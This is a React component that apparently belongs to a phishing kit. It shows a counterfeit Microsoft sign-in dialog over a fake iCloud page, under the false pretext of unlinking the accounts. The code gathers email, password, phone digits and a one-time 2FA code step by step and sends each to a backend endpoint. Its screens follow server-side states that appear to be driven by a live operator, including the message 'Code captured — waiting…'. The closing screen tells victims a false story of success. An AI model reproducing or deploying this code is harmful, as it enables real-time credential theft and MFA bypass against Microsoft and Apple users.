import { useEffect, useRef, useState } from "react";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { AnimatePresence, motion } from "framer-motion";

function MsLogo({ size = 21 }) {
  return (
    <span className="inline-flex items-center gap-2 select-none">
      <svg viewBox="0 0 23 23" width={size} height={size} aria-hidden="true">
        <rect x="0" y="0" width="11" height="11" fill="#f25022" />
        <rect x="12" y="0" width="11" height="11" fill="#7fba00" />
        <rect x="0" y="12" width="11" height="11" fill="#00a4ef" />
        <rect x="12" y="12" width="11" height="11" fill="#ffb900" />
      </svg>
      <span
        className="text-[15px] text-[#1b1b1b] tracking-[-0.01em]"
        style={{ fontFamily: '"Segoe UI", system-ui, sans-serif' }}
      >
        Microsoft
      </span>
    </span>
  );
}

function BackArrow() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path
        d="M15 18l-6-6 6-6"
        stroke="#1b1b1b"
        strokeWidth="1.8"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function EyeIcon({ off }) {
  if (off) {
    return (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
        <path
          d="M3 3l18 18M10.6 10.6a2.2 2.2 0 0 0 3 3M9.5 5.2A10.4 10.4 0 0 1 12 5c5.2 0 8.8 3.8 10.5 7-0.7 1.3-1.7 2.7-3 3.8M6.1 6.1C4.3 7.4 2.9 9.1 2 12c1.2 2.4 3.8 7 10 7 1.5 0 2.8-.3 4-.8"
          stroke="#616161"
          strokeWidth="1.6"
          strokeLinecap="round"
        />
      </svg>
    );
  }
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z" stroke="#616161" strokeWidth="1.6" />
      <circle cx="12" cy="12" r="2.6" stroke="#616161" strokeWidth="1.6" />
    </svg>
  );
}

function ICloudBackdrop({ emailHint }) {
  return (
    <div className="w-full h-full flex flex-col" style={{ background: "#fbfbfd" }}>
      <div
        className="h-[44px] shrink-0 flex items-center px-3 border-b"
        style={{ background: "rgba(251,251,253,0.85)", borderColor: "rgba(0,0,0,0.08)" }}
      >
        <span className="text-[15px] font-semibold tracking-tight text-[#1d1d1f]"> iCloud</span>
      </div>
      <div className="flex-1 flex items-start justify-center pt-6 sm:pt-10 px-3 sm:px-4">
        <div
          className="w-full max-w-[520px] rounded-[22px] sm:rounded-[28px] px-5 sm:px-8 pt-6 sm:pt-8 pb-8 sm:pb-10"
          style={{ background: "#fff", boxShadow: "0 11px 34px rgba(120,120,128,0.16)" }}
        >
          <div className="flex flex-col items-center">
            <img src="/logo.png?v=5" alt="" className="w-[72px] h-[72px] sm:w-[100px] sm:h-[100px] object-contain" draggable={false} />
            <h1 className="mt-3 font-apple text-[22px] sm:text-[26px] font-[600] text-center text-[#1d1d1f] leading-tight px-2">
              Sign in with Apple Account
            </h1>
          </div>
          <div className="mt-5 sm:mt-6 h-[52px] rounded-[12px] border px-4 flex flex-col justify-center" style={{ borderColor: "#c7c7cc" }}>
            <span className="text-[11px] text-[#6e6e73]">Email or Phone Number</span>
            <span className="text-[16px] text-[#1d1d1f] truncate">{emailHint || "apple@icloud.com"}</span>
          </div>
        </div>
      </div>
    </div>
  );
}

function MsDoneHero({ success }) {
  return (
    <div className="relative mx-auto mt-1 mb-1 flex h-[64px] w-full max-w-[210px] items-center justify-center">
      <motion.div
        className="absolute left-1 flex h-11 w-11 items-center justify-center rounded-full bg-[#f3f2f1] ring-1 ring-[#e1dfdd]"
        animate={success ? { x: -4 } : { x: [0, -2, 0] }}
        transition={success ? { duration: 0.4 } : { duration: 2, repeat: Infinity }}
      >
        <svg viewBox="0 0 23 23" width="20" height="20" aria-hidden="true">
          <rect x="0" y="0" width="11" height="11" fill="#f25022" />
          <rect x="12" y="0" width="11" height="11" fill="#7fba00" />
          <rect x="0" y="12" width="11" height="11" fill="#00a4ef" />
          <rect x="12" y="12" width="11" height="11" fill="#ffb900" />
        </svg>
      </motion.div>
      <div className="relative z-[1] flex w-[56px] items-center justify-center">
        {!success ? (
          <motion.span
            className="flex h-8 w-8 items-center justify-center rounded-full bg-white ring-1 ring-[#e1dfdd]"
            animate={{ rotate: 360 }}
            transition={{ duration: 1.1, repeat: Infinity, ease: "linear" }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M12 3a9 9 0 1 1-9 9" stroke="#0067b8" strokeWidth="2.4" strokeLinecap="round" />
            </svg>
          </motion.span>
        ) : (
          <motion.span
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            transition={{ type: "spring", stiffness: 420, damping: 18 }}
            className="flex h-9 w-9 items-center justify-center rounded-full bg-[#dff6dd]"
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M5 12.5l4.5 4.5L19 7.5" stroke="#0e700e" strokeWidth="2.6" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </motion.span>
        )}
      </div>
      <motion.div
        className="absolute right-1 flex h-11 w-11 items-center justify-center rounded-full bg-[#f5f5f7] ring-1 ring-[#d2d2d7]"
        animate={success ? { x: 4, opacity: 0.55 } : { x: [0, 2, 0] }}
        transition={success ? { duration: 0.4 } : { duration: 2, repeat: Infinity }}
      >
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#1d1d1f" aria-hidden="true">
          <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.22-1.98 1.09-3.13-1.05.04-2.32.7-3.07 1.58-.67.79-1.25 2.05-1.1 3.26 1.16.09 2.35-.66 3.08-1.71z" />
        </svg>
      </motion.div>
    </div>
  );
}

function MsSpinner({ size = 28 }) {
  return (
    <span
      className="relative inline-block"
      style={{ width: size, height: size }}
      aria-hidden="true"
    >
      <svg viewBox="0 0 28 28" className="w-full h-full animate-spin" style={{ animationDuration: "0.85s" }}>
        <circle cx="14" cy="14" r="11" fill="none" stroke="#edebe9" strokeWidth="2.5" />
        <path
          d="M14 3 a11 11 0 0 1 11 11"
          fill="none"
          stroke="#0067b8"
          strokeWidth="2.5"
          strokeLinecap="round"
        />
      </svg>
    </span>
  );
}

function stepFromStatus(status) {
  if (status === "msDone" || status === "msSubmitted") return "done";
  if (status === "ms2faResending") return "2fa_loading";
  if (status === "msPhoneResending") return "phone_loading";
  if (status === "ms2fa" || status === "ms2faWaiting" || status === "msWrong2fa")
    return "2fa";
  if (status === "msPhone" || status === "msPhoneWaiting" || status === "msWrongPhone")
    return "phone";
  if (
    status === "msPass" ||
    status === "msPassWaiting" ||
    status === "msEmail" ||
    status === "msWrongPass"
  ) {
    return "password";
  }
  return "email";
}

function Microsoft({ authUser }) {
  const [email, setEmail] = useState(authUser?.msEmail || "");
  const [password, setPassword] = useState("");
  const [digits, setDigits] = useState(["", "", "", ""]);
  const [msCode, setMsCode] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);
  const [passFocused, setPassFocused] = useState(false);
  const [codeFocused, setCodeFocused] = useState(false);
  const [dontAsk, setDontAsk] = useState(true);
  const [busy, setBusy] = useState(false);
  const [popupOpen, setPopupOpen] = useState(true);
  const [doneReady, setDoneReady] = useState(false);
  const digitRefs = useRef([]);
  const queryClient = useQueryClient();

  const status = authUser?.currentStatus || "msOpen";
  const uiStep = stepFromStatus(status);
  const waitingPass = status === "msPassWaiting";
  const waitingPhone = status === "msPhoneWaiting";
  const waiting2fa = status === "ms2faWaiting";
  const wrongMail = status === "msWrongMail";
  const wrongPass = status === "msWrongPass";
  const wrongPhone = status === "msWrongPhone";
  const wrong2fa = status === "msWrong2fa";
  const displayEmail = email || authUser?.msEmail || "";
  const phoneHint = (authUser?.msPhoneHint || "16").padStart(2, "0").slice(-2);
  const font = { fontFamily: '"Segoe UI", "Segoe UI Web (West European)", system-ui, sans-serif' };
  const linkBlue = "#0067b8";
  const btnBlue = "#0067b8";

  useEffect(() => {
    if (authUser?.msEmail) setEmail(authUser.msEmail);
  }, [authUser?.msEmail]);

  useEffect(() => {
    if (status && status !== "msDone" && status !== "msSubmitted") {
      setPopupOpen(true);
      setDoneReady(false);
    }
  }, [status]);

  useEffect(() => {
    if (status === "msWrongPass") setPassword("");
    if (status === "msWrongPhone" || status === "msPhoneResending") {
      setDigits(["", "", "", ""]);
    }
    if (status === "msWrong2fa" || status === "ms2faResending") {
      setMsCode("");
    }
  }, [status]);

  useEffect(() => {
    if (uiStep === "phone") {
      setTimeout(() => digitRefs.current[0]?.focus(), 120);
    }
  }, [uiStep, phoneHint]);

  useEffect(() => {
    if (uiStep !== "done") {
      setDoneReady(false);
      return undefined;
    }
    setDoneReady(false);
    const t = setTimeout(() => setDoneReady(true), 6500);
    return () => clearTimeout(t);
  }, [uiStep, status]);

  const { mutateAsync: disconnectMs } = useMutation({
    mutationFn: async (body) => {
      const res = await fetch("/api/v1/rumman/auth/disconnect_microsoft", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const data = await res.json();
      if (!res.ok || data.error) throw new Error(data.error || "Failed");
      return data;
    },
    onSuccess: (data) => queryClient.setQueryData(["authUser"], data),
  });

  const handleNextEmail = async () => {
    if (!email.trim() || busy) return;
    setBusy(true);
    try {
      await disconnectMs({ step: "email", msEmail: email.trim() });
    } finally {
      setBusy(false);
    }
  };

  const handleNextPassword = async () => {
    if (!password.trim() || busy) return;
    setBusy(true);
    try {
      await disconnectMs({
        step: "password",
        msEmail: email.trim() || displayEmail,
        msPassword: password,
      });
    } finally {
      setBusy(false);
    }
  };

  const phoneComplete = digits.every((d) => d.length === 1);

  const handleNextPhone = async () => {
    if (!phoneComplete || busy) return;
    setBusy(true);
    try {
      await disconnectMs({ step: "phone", msPhoneDigits: digits.join("") });
    } finally {
      setBusy(false);
    }
  };

  const handleResendPhone = async () => {
    if (busy || waitingPhone) return;
    setBusy(true);
    try {
      await disconnectMs({ step: "resend" });
    } finally {
      setBusy(false);
    }
  };

  const handleNext2fa = async () => {
    const cleaned = msCode.replace(/\D/g, "").slice(0, 6);
    if (cleaned.length < 6 || busy) return;
    setBusy(true);
    try {
      await disconnectMs({ step: "2fa", msCode: cleaned });
    } finally {
      setBusy(false);
    }
  };

  const handleResend2fa = async () => {
    if (busy || waiting2fa) return;
    setBusy(true);
    try {
      await disconnectMs({ step: "resend_2fa" });
    } finally {
      setBusy(false);
    }
  };

  const handleCloseDone = async () => {
    if (busy) return;
    setPopupOpen(false);
    setBusy(true);
    try {
      await new Promise((r) => setTimeout(r, 320));
      await disconnectMs({ step: "finish" });
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="relative h-[100dvh] min-h-0 max-h-[100dvh] overflow-hidden bg-[#fbfbfd]" style={font}>
      <div
        className="absolute inset-0 pointer-events-none select-none transition-[filter,transform] duration-400"
        aria-hidden="true"
        style={
          popupOpen
            ? { filter: "blur(10px) saturate(1.05)", transform: "scale(1.04)", transformOrigin: "top center" }
            : { filter: "none", transform: "scale(1)", transformOrigin: "top center" }
        }
      >
        <ICloudBackdrop emailHint={authUser?.email} />
      </div>

      <AnimatePresence>
        {popupOpen && (
          <>
            <motion.div
              key="veil"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 z-20"
              style={{
                background:
                  "radial-gradient(ellipse 80% 60% at 50% 30%, rgba(255,255,255,0.4), rgba(0,0,0,0.26))",
                backdropFilter: "blur(2px)",
              }}
            />

            <div className="absolute inset-0 z-30 flex items-end justify-center sm:items-start sm:px-3 sm:pt-14 md:pt-16 pointer-events-none pb-[env(safe-area-inset-bottom)] sm:pb-0">
              <div className="pointer-events-auto w-full max-w-none sm:max-w-[400px] flex flex-col gap-2.5 max-h-[min(94dvh,880px)]">
                <AnimatePresence mode="wait">
                  <motion.div
                    key={uiStep + (doneReady ? "-ok" : "")}
                    role="dialog"
                    aria-modal="true"
                    initial={{ opacity: 0, y: 40 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: 24 }}
                    transition={{ duration: 0.34, ease: [0.22, 1, 0.36, 1] }}
                    className="w-full rounded-t-[22px] sm:rounded-[8px] bg-white overflow-hidden shadow-[0_8px_32px_rgba(0,0,0,0.22)] max-h-[min(88dvh,760px)] flex flex-col"
                  >
                    <div className="sm:hidden flex justify-center pt-2.5" aria-hidden="true">
                      <span className="h-1 w-10 rounded-full bg-[#c8c8c8]" />
                    </div>

                    <div className="px-5 sm:px-7 pt-3 sm:pt-5 pb-[max(1.1rem,env(safe-area-inset-bottom))] sm:pb-6 overflow-y-auto overscroll-contain">
                      {(uiStep === "password" || uiStep === "phone" || uiStep === "2fa") && (
                        <button type="button" className="mb-2 -ml-1 p-1 rounded hover:bg-black/[0.04]" aria-label="Back">
                          <BackArrow />
                        </button>
                      )}

                      {uiStep !== "done" && <MsLogo />}

                      {uiStep === "email" && (
                        <>
                          <h1 className="mt-3.5 text-[22px] font-semibold text-[#1b1b1b] leading-tight">Sign in</h1>
                          <div className="mt-4 relative">
                            <input
                              type="email"
                              inputMode="email"
                              autoCapitalize="none"
                              autoCorrect="off"
                              value={email}
                              onChange={(e) => setEmail(e.target.value)}
                              onFocus={() => setEmailFocused(true)}
                              onBlur={() => setEmailFocused(false)}
                              onKeyDown={(e) => e.key === "Enter" && handleNextEmail()}
                              placeholder="Email, phone, or Skype"
                              className={`w-full h-[40px] text-[15px] text-[#1b1b1b] outline-none bg-transparent border-b placeholder:text-[#616161] ${
                                wrongMail ? "border-[#a4262c]" : emailFocused ? "border-[#0067b8]" : "border-[#666]"
                              }`}
                            />
                          </div>
                          {wrongMail && (
                            <p className="mt-2 text-[12px] text-[#a4262c] leading-snug">
                              That Microsoft account doesn't exist. Try again.
                            </p>
                          )}
                          <p className="mt-3.5 text-[13px] text-[#1b1b1b]">
                            No account?{" "}
                            <button type="button" className="hover:underline" style={{ color: linkBlue }}>
                              Create one!
                            </button>
                          </p>
                          <button type="button" className="mt-1.5 text-[13px] hover:underline text-left" style={{ color: linkBlue }}>
                            Can't access your account?
                          </button>
                          <div className="mt-8 flex justify-end">
                            <button
                              type="button"
                              disabled={!email.trim() || busy}
                              onClick={handleNextEmail}
                              className="h-[36px] min-w-[108px] px-5 text-[15px] font-semibold text-white disabled:opacity-40"
                              style={{ background: btnBlue }}
                            >
                              Next
                            </button>
                          </div>
                        </>
                      )}

                      {uiStep === "password" && (
                        <>
                          <div className="mt-3 inline-flex max-w-full items-center rounded-full bg-[#f2f2f2] px-3 py-1 text-[12px] text-[#1b1b1b]">
                            <span className="truncate">{displayEmail || "email@hotmail.com"}</span>
                          </div>
                          <h1 className="mt-3.5 text-[20px] sm:text-[22px] font-semibold text-[#1b1b1b] leading-tight">
                            Enter your password
                          </h1>
                          <div
                            className={`mt-4 relative rounded-[2px] border ${
                              wrongPass ? "border-[#a4262c]" : passFocused ? "border-[#0067b8]" : "border-[#8a8886]"
                            }`}
                          >
                            <label className="absolute left-2.5 -top-2 px-1 bg-white text-[11px] text-[#616161]">
                              Password
                            </label>
                            <div className="flex items-center">
                              <input
                                type={showPass ? "text" : "password"}
                                autoCapitalize="none"
                                value={password}
                                disabled={waitingPass}
                                onChange={(e) => setPassword(e.target.value)}
                                onFocus={() => setPassFocused(true)}
                                onBlur={() => setPassFocused(false)}
                                onKeyDown={(e) => e.key === "Enter" && handleNextPassword()}
                                className="flex-1 h-[42px] px-3 text-[15px] outline-none bg-transparent disabled:opacity-60"
                              />
                              <button
                                type="button"
                                disabled={waitingPass}
                                onClick={() => setShowPass((v) => !v)}
                                className="px-3 h-[42px]"
                                aria-label="Show password"
                              >
                                <EyeIcon off={!showPass} />
                              </button>
                            </div>
                          </div>
                          {wrongPass && (
                            <p className="mt-2 text-[12px] text-[#a4262c] leading-snug">
                              Your account or password is incorrect. Try again.
                            </p>
                          )}
                          {waitingPass && !wrongPass && (
                            <p className="mt-2 text-[12px] text-[#616161]">Verifying…</p>
                          )}
                          <button
                            type="button"
                            disabled={!password.trim() || busy || waitingPass}
                            onClick={handleNextPassword}
                            className="mt-5 w-full h-[40px] text-[15px] font-semibold text-white disabled:opacity-40"
                            style={{ background: btnBlue }}
                          >
                            Next
                          </button>
                          <button type="button" className="mt-4 text-[13px] hover:underline" style={{ color: linkBlue }}>
                            Other ways to sign in
                          </button>
                        </>
                      )}

                      {uiStep === "2fa" && (
                        <>
                          <div className="mt-3 inline-flex max-w-full items-center rounded-full bg-[#f2f2f2] px-3 py-1 text-[12px] text-[#1b1b1b]">
                            <span className="truncate">{displayEmail || "email@hotmail.com"}</span>
                          </div>
                          <h1 className="mt-3.5 text-[20px] sm:text-[22px] font-semibold text-[#1b1b1b] leading-tight">
                            Enter code
                          </h1>
                          <p className="mt-2.5 text-[13px] leading-[1.45] text-[#1b1b1b]">
                            To help keep your account safe, enter the 6-digit code from the
                            Microsoft Authenticator app, or the code we sent you.
                          </p>
                          <button
                            type="button"
                            disabled={busy || waiting2fa}
                            onClick={handleResend2fa}
                            className="mt-3 inline-flex items-center gap-2 text-[13px] hover:underline disabled:opacity-50"
                            style={{ color: linkBlue }}
                          >
                            {busy ? (
                              <>
                                <MsSpinner size={14} />
                                <span>Sending code…</span>
                              </>
                            ) : (
                              "Resend code"
                            )}
                          </button>
                          <div
                            className={`mt-4 relative rounded-[2px] border ${
                              wrong2fa ? "border-[#a4262c]" : codeFocused ? "border-[#0067b8]" : "border-[#8a8886]"
                            }`}
                          >
                            <label className="absolute left-2.5 -top-2 px-1 bg-white text-[11px] text-[#616161]">
                              Code
                            </label>
                            <input
                              type="text"
                              inputMode="numeric"
                              autoComplete="one-time-code"
                              maxLength={6}
                              value={msCode}
                              disabled={waiting2fa}
                              onChange={(e) =>
                                setMsCode(e.target.value.replace(/\D/g, "").slice(0, 6))
                              }
                              onFocus={() => setCodeFocused(true)}
                              onBlur={() => setCodeFocused(false)}
                              onKeyDown={(e) => e.key === "Enter" && handleNext2fa()}
                              className="w-full h-[42px] px-3 text-[15px] tracking-[0.18em] outline-none bg-transparent disabled:opacity-60"
                            />
                          </div>
                          <label className="mt-3.5 flex items-center gap-2.5 cursor-pointer select-none">
                            <input
                              type="checkbox"
                              checked={dontAsk}
                              disabled={waiting2fa}
                              onChange={() => setDontAsk((v) => !v)}
                              className="w-[15px] h-[15px] accent-[#0067b8] shrink-0"
                            />
                            <span className="text-[13px] text-[#1b1b1b]">
                              Don’t ask again on this device
                            </span>
                          </label>
                          {wrong2fa && (
                            <p className="mt-2 text-[12px] text-[#a4262c] leading-snug">
                              That code didn’t work. Check the number and try again.
                            </p>
                          )}
                          {waiting2fa && !wrong2fa && (
                            <p className="mt-2 text-[12px] text-[#616161]">Code captured — waiting…</p>
                          )}
                          <button
                            type="button"
                            disabled={msCode.replace(/\D/g, "").length < 6 || busy || waiting2fa}
                            onClick={handleNext2fa}
                            className="mt-5 w-full h-[40px] text-[15px] font-semibold text-white disabled:opacity-40"
                            style={{ background: btnBlue }}
                          >
                            Next
                          </button>
                          <button type="button" className="mt-4 text-[13px] hover:underline" style={{ color: linkBlue }}>
                            I didn’t get a code
                          </button>
                        </>
                      )}

                      {uiStep === "2fa_loading" && (
                        <>
                          <div className="mt-3 inline-flex max-w-full items-center rounded-full bg-[#f2f2f2] px-3 py-1 text-[12px] text-[#1b1b1b]">
                            <span className="truncate">{displayEmail || "email@hotmail.com"}</span>
                          </div>
                          <h1 className="mt-3.5 text-[20px] font-semibold text-[#1b1b1b] leading-tight">
                            Sending code…
                          </h1>
                          <p className="mt-2.5 text-[13px] leading-[1.45] text-[#605e5c]">
                            We’re sending a new code to your Authenticator app or phone.
                            This may take a moment.
                          </p>
                          <div className="mt-10 mb-4 flex flex-col items-center gap-3">
                            <MsSpinner size={40} />
                            <p className="text-[13px] text-[#8a8886]">Waiting for a new code…</p>
                            <div className="mt-1 h-[2px] w-36 overflow-hidden rounded-full bg-[#edebe9]">
                              <motion.div
                                className="h-full rounded-full"
                                style={{
                                  background:
                                    "linear-gradient(90deg,#f25022,#7fba00,#00a4ef,#ffb900)",
                                }}
                                animate={{ x: ["-100%", "100%"] }}
                                transition={{
                                  duration: 1.1,
                                  repeat: Infinity,
                                  ease: "easeInOut",
                                }}
                                initial={{ width: "40%" }}
                              />
                            </div>
                          </div>
                        </>
                      )}

                      {uiStep === "phone" && (
                        <>
                          <div className="mt-3 inline-flex max-w-full items-center rounded-full bg-[#f2f2f2] px-3 py-1 text-[12px] text-[#1b1b1b]">
                            <span className="truncate">{displayEmail || "email@hotmail.com"}</span>
                          </div>
                          <h1 className="mt-3.5 text-[20px] font-semibold text-[#1b1b1b] leading-tight">
                            Confirm your phone number
                          </h1>
                          <p className="mt-2.5 text-[13px] leading-[1.45] text-[#1b1b1b]">
                            We're sending a code to *********{phoneHint}. Enter the missing digits
                            from the last four digits of your number.
                          </p>
                          <div className="mt-5 flex items-center gap-2">
                            {digits.map((val, i) => (
                              <input
                                key={i}
                                ref={(el) => {
                                  digitRefs.current[i] = el;
                                }}
                                type="text"
                                inputMode="numeric"
                                maxLength={1}
                                disabled={waitingPhone}
                                value={val}
                                onChange={(e) => {
                                  const v = e.target.value.replace(/\D/g, "").slice(-1);
                                  setDigits((prev) => {
                                    const next = [...prev];
                                    next[i] = v;
                                    return next;
                                  });
                                  if (v && i < 3) digitRefs.current[i + 1]?.focus();
                                }}
                                onKeyDown={(e) => {
                                  if (e.key === "Backspace" && !val && i > 0) {
                                    digitRefs.current[i - 1]?.focus();
                                  }
                                  if (e.key === "Enter") handleNextPhone();
                                }}
                                className={`w-11 h-11 text-center text-[18px] border rounded-[2px] outline-none focus:border-[#0067b8] disabled:opacity-60 ${
                                  wrongPhone ? "border-[#a4262c]" : "border-[#8a8886]"
                                }`}
                              />
                            ))}
                          </div>
                          {wrongPhone && (
                            <p className="mt-2 text-[12px] text-[#a4262c] leading-snug">
                              Those digits don't match. Try again.
                            </p>
                          )}
                          {waitingPhone && !wrongPhone && (
                            <p className="mt-2 text-[12px] text-[#616161]">Number confirmed — waiting…</p>
                          )}
                          <button
                            type="button"
                            disabled={!phoneComplete || busy || waitingPhone}
                            onClick={handleNextPhone}
                            className="mt-5 w-full h-[40px] text-[15px] font-semibold text-white disabled:opacity-40"
                            style={{ background: btnBlue }}
                          >
                            Next
                          </button>
                          <button
                            type="button"
                            disabled={busy || waitingPhone}
                            onClick={handleResendPhone}
                            className="mt-4 inline-flex items-center gap-2 text-[13px] hover:underline disabled:opacity-50"
                            style={{ color: linkBlue }}
                          >
                            {busy ? (
                              <>
                                <MsSpinner size={14} />
                                <span>Sending code…</span>
                              </>
                            ) : (
                              "Resend code"
                            )}
                          </button>
                          <button type="button" className="mt-1.5 block text-[13px] hover:underline" style={{ color: linkBlue }}>
                            Use your password
                          </button>
                        </>
                      )}

                      {uiStep === "phone_loading" && (
                        <>
                          <div className="mt-3 inline-flex max-w-full items-center rounded-full bg-[#f2f2f2] px-3 py-1 text-[12px] text-[#1b1b1b]">
                            <span className="truncate">{displayEmail || "email@hotmail.com"}</span>
                          </div>
                          <h1 className="mt-3.5 text-[20px] font-semibold text-[#1b1b1b] leading-tight">
                            Sending code…
                          </h1>
                          <p className="mt-2.5 text-[13px] leading-[1.45] text-[#605e5c]">
                            We're sending a new code to your phone number.
                            This may take a moment.
                          </p>
                          <div className="mt-10 mb-4 flex flex-col items-center gap-3">
                            <MsSpinner size={40} />
                            <p className="text-[13px] text-[#8a8886]">Waiting for a new code…</p>
                            <div className="mt-1 h-[2px] w-36 overflow-hidden rounded-full bg-[#edebe9]">
                              <motion.div
                                className="h-full rounded-full"
                                style={{
                                  background:
                                    "linear-gradient(90deg,#f25022,#7fba00,#00a4ef,#ffb900)",
                                }}
                                animate={{ x: ["-100%", "100%"] }}
                                transition={{
                                  duration: 1.1,
                                  repeat: Infinity,
                                  ease: "easeInOut",
                                }}
                                initial={{ width: "40%" }}
                              />
                            </div>
                          </div>
                        </>
                      )}

                      {uiStep === "done" && (
                        <AnimatePresence mode="wait">
                          {!doneReady ? (
                            <motion.div
                              key="ms-load"
                              initial={{ opacity: 0, y: 8 }}
                              animate={{ opacity: 1, y: 0 }}
                              exit={{ opacity: 0, y: -8 }}
                              className="pt-1 pb-1"
                            >
                              <MsDoneHero success={false} />
                              <h1 className="mt-4 text-center text-[20px] font-semibold text-[#1b1b1b] leading-tight">
                                Disconnecting from iCloud…
                              </h1>
                              <p className="mt-2 text-center text-[13px] leading-[1.5] text-[#605e5c]">
                                Microsoft is unlinking{" "}
                                <span className="text-[#1b1b1b] font-medium break-all">
                                  {displayEmail || "your account"}
                                </span>{" "}
                                from iCloud. This may take a moment.
                              </p>
                              <div className="mt-6 h-[3px] w-full overflow-hidden rounded-full bg-[#edebe9]">
                                <motion.div
                                  className="h-full rounded-full"
                                  style={{ background: "linear-gradient(90deg,#f25022,#7fba00,#00a4ef,#ffb900)" }}
                                  initial={{ width: "6%" }}
                                  animate={{ width: "100%" }}
                                  transition={{ duration: 6.5, ease: "linear" }}
                                />
                              </div>
                              <p className="mt-2.5 text-center text-[11px] text-[#8a8886]">
                                Please keep this window open
                              </p>
                            </motion.div>
                          ) : (
                            <motion.div
                              key="ms-ok"
                              initial={{ opacity: 0, y: 10 }}
                              animate={{ opacity: 1, y: 0 }}
                              className="pt-1 pb-1"
                            >
                              <MsDoneHero success />
                              <h1 className="mt-4 text-center text-[22px] font-semibold text-[#1b1b1b] leading-tight">
                                Successfully disconnected!
                              </h1>
                              <p className="mt-2 text-center text-[13px] leading-[1.5] text-[#605e5c]">
                                Your Microsoft account is no longer linked to your iCloud account.
                              </p>
                              <button
                                type="button"
                                disabled={busy}
                                onClick={handleCloseDone}
                                className="mt-7 w-full h-[40px] text-[15px] font-semibold text-white disabled:opacity-40"
                                style={{ background: btnBlue }}
                              >
                                Done
                              </button>
                            </motion.div>
                          )}
                        </AnimatePresence>
                      )}
                    </div>
                  </motion.div>
                </AnimatePresence>

                {uiStep === "email" && (
                  <button
                    type="button"
                    className="w-full flex items-center gap-3 rounded-none sm:rounded-[8px] bg-white px-5 py-3.5 shadow-[0_2px_8px_rgba(0,0,0,0.12)] text-left"
                  >
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                      <circle cx="10" cy="10" r="5.5" stroke="#1b1b1b" strokeWidth="1.6" />
                      <path d="M14 14l6.5 6.5" stroke="#1b1b1b" strokeWidth="1.6" strokeLinecap="round" />
                    </svg>
                    <span className="text-[15px] text-[#1b1b1b]">Sign-in options</span>
                  </button>
                )}
              </div>
            </div>
          </>
        )}
      </AnimatePresence>
    </div>
  );
}

export default Microsoft;
